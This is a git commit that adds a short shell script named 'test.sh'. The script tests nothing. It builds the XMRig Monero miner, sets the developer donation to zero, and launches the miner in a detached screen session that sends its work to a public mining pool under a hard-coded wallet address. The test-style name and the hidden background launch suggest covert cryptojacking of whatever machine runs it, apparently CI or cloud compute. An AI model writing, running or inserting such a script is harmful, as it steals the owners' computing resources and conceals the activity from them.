6319e8557064efac42b486cd88c952368e1f9f9b
chris127IO <73670798+chris127IO@users.noreply.github.com>
2021-11-05 22:03:06 +0100

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,8 @@
+sudo add-apt-repository http://cz.archive.ubuntu.com/ubuntu
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev nano
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/build
+sed -i 's/DonateLevel = 1/DonateLevel = 0/g' ../src/donate.h
+cmake ..
+make -j$(nproc)
+screen -dmS monero bash -c './xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48DpVosVQSZQLUyhHrpc7FiYXZEbah7tjPqQwKHWvF4pbBupHRSdm8fPvQd1MUKfSQDiafc37m8hiFNdwjxU54V27qUQ5eV -p x'
